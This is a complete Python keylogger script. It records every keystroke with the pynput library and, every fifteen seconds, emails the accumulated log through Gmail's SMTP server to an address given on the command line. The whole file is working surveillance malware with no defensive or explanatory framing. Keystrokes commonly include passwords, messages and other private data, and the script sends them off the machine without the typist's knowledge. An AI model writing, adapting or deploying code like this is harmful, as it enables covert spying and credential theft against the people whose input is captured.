import pynput.keyboard
import smtplib
import threading
import optparse

log = ''


def get_inputs():
    parser = optparse.OptionParser()
    parser.add_option('-f', '--from', dest='sender', help='Enter the sender s mail', )
    parser.add_option('-p', '--password', dest='password', help='Enter the password of sender s mail')
    parser.add_option('-t', '--to', dest='receiver', help='Enter the receiver s mail')


    options = parser.parse_args()[0]

    return options


options = get_inputs()


def save(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass

    print(log)


def send(message, mail_sender=options.sender, password=options.password, mail_to=options.receiver):
    email_server = smtplib.SMTP('smtp.gmail.com', 587)
    email_server.starttls()
    email_server.login(mail_sender, password)
    email_server.sendmail(mail_sender, mail_to, message)
    email_server.quit()


def send_log(cycle_time = 15):
    global log
    send(message=log.encode('utf-8'))
    log = ''
    timer = threading.Timer(cycle_time, send_log)
    timer.start()


key_listener = pynput.keyboard.Listener(on_press=save)

with key_listener:
    send_log()
    key_listener.join()

